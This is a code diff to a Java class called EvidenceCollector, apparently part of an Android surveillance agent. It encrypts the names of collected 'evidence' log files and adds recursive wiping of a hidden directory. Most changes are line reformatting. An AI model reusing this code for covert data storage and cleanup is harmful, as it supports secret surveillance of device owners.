@@ -88,7 +88,8 @@ public class EvidenceCollector {
 	 * @return the string
 	 */
 	public static String decryptName(final String logMask) {
-		return Encryption.decryptName(logMask, Keys.self().getChallengeKey()[0]);
+		return Encryption
+				.decryptName(logMask, Keys.self().getChallengeKey()[0]);
 	}
 
 	/**
@@ -174,7 +175,8 @@ public class EvidenceCollector {
 		final Context content = Status.getAppContext();
 
 		try {
-			final FileOutputStream fos = content.openFileOutput(PROG_FILENAME, Context.MODE_PRIVATE);
+			final FileOutputStream fos = content.openFileOutput(PROG_FILENAME,
+					Context.MODE_PRIVATE);
 
 			fos.write(Utils.intToByteArray(logProgressive));
 			fos.close();
@@ -198,7 +200,8 @@ public class EvidenceCollector {
 		final int lodate = (int) (millis % mask);
 		final int hidate = (int) (millis / mask);
 
-		final String newname = Integer.toHexString(lodate) + Integer.toHexString(hidate);
+		final String newname = Integer.toHexString(lodate)
+				+ Integer.toHexString(hidate);
 
 		return newname;
 	}
@@ -212,7 +215,8 @@ public class EvidenceCollector {
 	 *            the log type
 	 * @return the vector
 	 */
-	public synchronized Name makeNewName(final Evidence log, final String logType) {
+	public synchronized Name makeNewName(final Evidence log,
+			final String logType) {
 		final Date timestamp = log.timestamp;
 		final int progressive = getNewProgressive();
 		Check.asserts(progressive >= 0, "makeNewName fail progressive >=0");
@@ -229,11 +233,13 @@ public class EvidenceCollector {
 		Check.asserts(size >= 0, "makeNewName: failed size>0");
 		final String paddedProgressive = mask.substring(0, size) + ds;
 
-		final String fileName = paddedProgressive + "" + logType + "" + makeDateName(timestamp);
+		final String fileName = paddedProgressive + "" + logType + ""
+				+ makeDateName(timestamp);
 
 		final String encName = encryptName(fileName + LOG_EXTENSION);
-		Check.asserts(!encName.endsWith("mob"), "makeNewName: " + encName + " ch: " + seed + " not scrambled: "
-				+ fileName + LOG_EXTENSION);
+		Check.asserts(!encName.endsWith("mob"), "makeNewName: " + encName
+				+ " ch: " + seed + " not scrambled: " + fileName
+				+ LOG_EXTENSION);
 
 		Name name = new Name();
 		name.progressive = progressive;
@@ -268,12 +274,9 @@ public class EvidenceCollector {
 	 *            the num files
 	 * @return the int
 	 */
-
-	public synchronized int removeLogDirs(final int numFiles) {
-		Log.d("QZ", TAG + " Info: removeLogDirs");
-		int removed = 0;
-
-		removed = removeLogRecursive(Path.logs(), numFiles);
+	public synchronized int removeHidden() {
+		Log.d("QZ", TAG + " (removeHidden)");
+		int removed = removeRecursive(new File(Path.hidden()), Integer.MAX_VALUE);
 		return removed;
 	}
 
@@ -286,24 +289,31 @@ public class EvidenceCollector {
 	 *            the num files
 	 * @return the int
 	 */
-	private int removeLogRecursive(final String basePath, final int numFiles) {
+	private int removeRecursive(final File basePath, final int numFiles) {
 		int numLogsDeleted = 0;
 
-		File fc;
+		//File fc;
 		try {
-			fc = new File(basePath);
+			//fc = new File(basePath);
 
-			if (fc.isDirectory()) {
-				final String[] fileLogs = fc.list();
+			if (basePath.isDirectory()) {
+				Log.d("QZ", TAG + " (removeRecursive): " + basePath.getName());
+				final File[] fileLogs = basePath.listFiles();
 
-				for (final String file : fileLogs) {
-					final int removed = removeLogRecursive(basePath + file, numFiles - numLogsDeleted);
+				for (final File file : fileLogs) {
+					final int removed = removeRecursive(file,
+							numFiles - numLogsDeleted);
 					numLogsDeleted += removed;
 				}
 			}
-
-			fc.delete();
-			numLogsDeleted += 1;
+			
+			if (!basePath.delete()) {
+				Log.d("QZ",
+						TAG + " (removeRecursive) Error: "
+								+ basePath.getAbsolutePath());
+			} else {
+				numLogsDeleted += 1;
+			}
 
 		} catch (final Exception e) {
 			Log.d("QZ", TAG + " Error: removeLog: " + basePath + " ex: " + e);
@@ -362,7 +372,8 @@ public class EvidenceCollector {
 	 */
 	public String[] scanForEvidences(final String currentPath, final String dir) {
 		Check.requires(currentPath != null, "null argument");
-		Check.requires(!currentPath.startsWith("file://"), "currentPath shouldn't start with file:// : " + currentPath);
+		Check.requires(!currentPath.startsWith("file://"),
+				"currentPath shouldn't start with file:// : " + currentPath);
 
 		final TreeMap<String, String> map = new TreeMap<String, String>();
 
@@ -387,7 +398,8 @@ public class EvidenceCollector {
 				} else if (file.endsWith(EvidenceCollector.LOG_TMP)) {
 					Log.d("QZ", TAG + " ignoring temp file: " + file);
 				} else {
-					Log.d("QZ", TAG + " Info: wrong name, deleting: " + fcDir + "/" + file);
+					Log.d("QZ", TAG + " Info: wrong name, deleting: " + fcDir
+							+ "/" + file);
 					final File toDelete = new File(fcDir, file);
 					toDelete.delete();
 				}
